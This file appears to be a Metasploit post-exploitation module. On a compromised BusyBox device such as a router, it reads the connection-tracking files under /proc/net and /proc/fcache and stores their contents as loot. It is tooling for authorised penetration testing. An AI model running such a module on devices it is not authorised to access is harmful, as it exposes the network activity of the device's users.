##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Post

  include Msf::Post::File
  include Msf::Post::Linux::Busybox

  def initialize
    super(
      'Name'         => 'BusyBox Enumerate Connections',
      'Description'  => 'This module will be applied on a session connected
                         to a BusyBox sh shell. The script will enumerate
                         the connections established by the hosts connected
                         to the router or device executing BusyBox.',
      'Author'       => 'Javier Vicente Vallejo',
      'License'      => MSF_LICENSE,
      'References'   =>
        [
          [ 'URL', 'http://vallejo.cc']
        ],
      'Platform'      => ['linux'],
       'SessionTypes'  => ['shell']
    )
  end

  def run
    found = false
    conns_files =[
      "/proc/net/nf_conntrack", "/proc/net/ip_conntrack", "/proc/net/tcp", "/proc/net/udp", "/proc/net/arp", "/proc/fcache/*"
    ]
    vprint_status("Searching for files that store information about network connections.")
    conns_files.each do |conns_file|
      if file_exists(conns_file)
        found = true
        print_good("Connections File found: #{conns_file}.")
        begin
          str_file=read_file(conns_file)
          vprint_line(str_file)
          #Store file
          p = store_loot("Connections", "text/plain", session, str_file, conns_file, "BusyBox Device Network Established Connections")
          print_good("Connections saved to #{p}.")
        rescue EOFError
          # If there's nothing in the file, we hit EOFError
          print_error("Nothing read from file #{conns_file}, file may be empty.")
        end
      end
    end
    if found == false
      print_error("Nothing read from connection files, files may be empty.")
    end
  end

end
